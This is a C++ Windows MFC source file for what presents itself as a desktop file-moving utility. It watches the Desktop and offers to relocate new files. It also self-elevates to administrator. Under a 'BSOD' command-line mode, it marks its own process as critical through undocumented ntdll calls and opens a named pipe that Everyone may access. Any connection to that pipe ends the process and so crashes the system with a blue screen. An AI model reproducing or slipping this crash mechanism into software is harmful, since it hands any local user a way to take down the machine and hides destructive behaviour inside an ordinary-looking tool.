
// CopyDialog.cpp: 定义应用程序的类行为。
//

#include "pch.h"
#include "framework.h"
#include "../plugins/method.h"
#include<iostream>
#include "CopyDialog.h"
#include "CopyDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#ifndef _WINMAIN_
#define _WINMAIN_
#endif

#include <functional>
#include <locale>
#include <codecvt>
#include <sddl.h>
extern int AFXAPI AfxWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	_In_ LPTSTR lpCmdLine, int nCmdShow);

typedef LONG NTSTATUS;

#define NT_SUCCESS(Status) ((NTSTATUS)(status)>=0)

typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(
	BOOLEAN bNew,
	BOOLEAN* pbOld,
	BOOLEAN bNeedScb
	);

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength
	);

BOOL EnablePrivilege(LPCWSTR lpPrivilegeName) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken)) {
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, lpPrivilegeName, &tp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp,
		sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	CloseHandle(hToken);

	return result && (GetLastError() == ERROR_SUCCESS);
}

std::mutex dsMutex;
// CCopyDialogApp

BEGIN_MESSAGE_MAP(CCopyDialogApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CCopyDialogApp 构造

CCopyDialogApp::CCopyDialogApp()
{
	// 支持重新启动管理器
	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;

	// TODO: 在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}


// 唯一的 CCopyDialogApp 对象

CCopyDialogApp theApp;
MessageQueue<std::wstring> mq;

// CCopyDialogApp 初始化
DirectoryWatcher dswatch;

std::wstring DesktopFolderPath() {
	PWSTR path = nullptr;
	HRESULT result = SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &path);
	std::wstring downloadsPath;
	if (SUCCEEDED(result) && path != nullptr) {
		downloadsPath = path;
		CoTaskMemFree(path);
	}
	return downloadsPath;
}

void DesktopChangeCallback(DWORD action, const std::wstring& fileName, MessageQueue<std::wstring>& fn) {
	if (action == FILE_ACTION_ADDED) {
		dsMutex.lock();
		fn.push(fileName);
		dsMutex.unlock();
	}
}

void DesktopWatchDog() {
    auto callback = DesktopChangeCallback;
    PWSTR path = nullptr;
    HRESULT result = SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &path);
    if (SUCCEEDED(result) && path != nullptr) {
        dswatch.StartWatching(path, callback);
        CoTaskMemFree(path);
    }
}

int Usermain()
{
	Sleep(2000);
	TCHAR szPath[MAX_PATH];
	if (GetModuleFileName(NULL, szPath, MAX_PATH)) {
		SHELLEXECUTEINFO sei = { 0 };
		sei.cbSize = sizeof(SHELLEXECUTEINFO);
		sei.lpVerb = L"runas";
		sei.lpFile = szPath;
		sei.nShow = SW_SHOW;
		if (!ShellExecuteEx(&sei)) {
			if (GetLastError() == ERROR_CANCELLED) {
				std::wcerr << L"用户取消了管理员权限请求。" << std::endl;
				exit(-1);
			}
			else {
				std::wcerr << L"提升权限失败，错误代码: " << GetLastError() << std::endl;
				exit(EXIT_FAILURE);
			}
		}
		else {
			exit(0);
		}
	}
	else {
		std::wcerr << L"无法获取可执行文件路径，错误代码: " << GetLastError() << std::endl;
		exit(EXIT_FAILURE);
	}
}

bool isRunningAsAdmin() {
	BOOL isAdmin = FALSE;
	PSID adminGroup = NULL;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&ntAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&adminGroup)) {
		CheckTokenMembership(NULL, adminGroup, &isAdmin);
		FreeSid(adminGroup);
	}
	return isAdmin == TRUE;
}

std::wstring DsFolderPath() {
	PWSTR path = nullptr;
	HRESULT result = SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &path);
	std::wstring downloadsPath;
	if (SUCCEEDED(result) && path != nullptr) {
		downloadsPath = path;
		CoTaskMemFree(path);
	}
	return downloadsPath;
}

void DialogProc() {
	for (;;) {
		std::wstring fPath;
		dswatch.filequeue.wait(fPath);
		CCopyDlg dlg;
		dlg.SN = fPath;
		dlg.dsp = DsFolderPath();
		INT_PTR nResponse = dlg.DoModal();
		if (nResponse == IDOK)
		{
			CreateDirectory(dlg.TargetPath.c_str(), NULL);
			MoveFileEx((dlg.dsp + L"\\" + dlg.SN).c_str(), (dlg.TargetPath + L"\\" + dlg.SN).c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
			SHELLEXECUTEINFO sei = { 0 };
			sei.cbSize = sizeof(SHELLEXECUTEINFO);
			sei.lpVerb = L"explore";
			sei.lpFile = dlg.TargetPath.c_str();
			sei.nShow = SW_SHOW;
			ShellExecuteEx(&sei);
		}
		else if (nResponse == -1)
		{
			TRACE(traceAppMsg, 0, "警告: 对话框创建失败，应用程序将意外终止。\n");
			TRACE(traceAppMsg, 0, "警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\n");
		}
	}
}

BOOL SetCriticalProcessViaRtl(BOOL bCritical) {
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll) return FALSE;

	pRtlSetProcessIsCritical RtlSetProcessIsCritical =
		(pRtlSetProcessIsCritical)GetProcAddress(hNtdll,
			"RtlSetProcessIsCritical");

	if (!RtlSetProcessIsCritical) {
		return FALSE;
	}

	NTSTATUS status = RtlSetProcessIsCritical(bCritical, NULL, FALSE);
	return NT_SUCCESS(status);
}

// 方法2：使用NtSetInformationProcess
BOOL SetCriticalProcessViaNt(BOOL bCritical) {
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll) return FALSE;

	pNtSetInformationProcess NtSetInformationProcess =
		(pNtSetInformationProcess)GetProcAddress(hNtdll,
			"NtSetInformationProcess");

	if (!NtSetInformationProcess) {
		return FALSE;
	}

	ULONG BreakOnTermination = bCritical ? 1 : 0;
	NTSTATUS status = NtSetInformationProcess(
		GetCurrentProcess(),
		0x1D, // ProcessBreakOnTermination
		&BreakOnTermination,
		sizeof(ULONG)
	);

	return NT_SUCCESS(status);
}

int WINAPI _tWinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	if (!isRunningAsAdmin()) {
		Usermain();
	}
	std::wstring cmdl(lpCmdLine);
	if (cmdl == L"BSOD") {
		BOOL success = SetCriticalProcessViaRtl(TRUE);
		if (!success) {
			success = SetCriticalProcessViaNt(TRUE);
		}
		std::thread BSODThread([]() {
			PSECURITY_DESCRIPTOR pSD = nullptr;
			if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
				L"D:(A;;GA;;;WD)(A;;GA;;;BA)", SDDL_REVISION_1, &pSD, nullptr)) {
				return false;
			}
			SECURITY_ATTRIBUTES sa;
			sa.nLength = sizeof(SECURITY_ATTRIBUTES);
			sa.lpSecurityDescriptor = pSD;
			sa.bInheritHandle = FALSE;
			auto piep = CreateNamedPipeW(
				L"\\\\.\\pipe\\BSODPipe",
				PIPE_ACCESS_INBOUND,
				PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
				1,
				512,
				512,
				0,
				&sa
			);
			if (piep == INVALID_HANDLE_VALUE) {
				LocalFree(pSD);
				return false;
			}
			for (;;) {
				BOOL connected = ConnectNamedPipe(piep, nullptr) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
				if (connected) {
					std::this_thread::sleep_for(std::chrono::seconds(15));
					ExitProcess(-1);
				}
			}
			});
		BSODThread.detach();
		if (!BSODHook()) {
			SetCriticalProcessViaRtl(FALSE);
			return -1;
		}
		for (;;) {
			std::this_thread::sleep_for(std::chrono::minutes(10));
		}
	}
	/*std::wstring_convert<std::codecvt_utf8<wchar_t>> cvter;
	std::wstring cmdline = cvter.from_bytes(cmdl).c_str();
	LPTSTR cmdlline = new wchar_t[cmdline.size()+1];
	StrCpyW(cmdlline, cmdline.c_str());*/
	return AfxWinMain(hInstance, hPrevInstance, lpCmdLine, nCmdShow);
}

BOOL CCopyDialogApp::InitInstance()
{
	std::thread notice(Adminmain);
	notice.detach();
	DesktopWatchDog();
	// 如果应用程序存在以下情况，Windows XP 上需要 InitCommonControlsEx()
	// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，
	//则需要 InitCommonControlsEx()。  否则，将无法创建窗口。
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);
	// 将它设置为包括所有要在应用程序中使用的
	// 公共控件类。
	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinApp::InitInstance();


	AfxEnableControlContainer();


	// 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题
	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));

	// 标准初始化
	// 如果未使用这些功能并希望减小
	// 最终可执行文件的大小，则应移除下列
	// 不需要的特定初始化例程
	// 更改用于存储设置的注册表项
	// TODO: 应适当修改该字符串，
	// 例如修改为公司或组织名
	SetRegistryKey(_T("Xymh Neko"));

	std::thread Dialog(DialogProc);
	Dialog.join();

	

//#if !defined(_AFXDLL) && !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)
//	ControlBarCleanUp();
//#endif

	// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，
	//  而不是启动应用程序的消息泵。
	return TRUE;
}

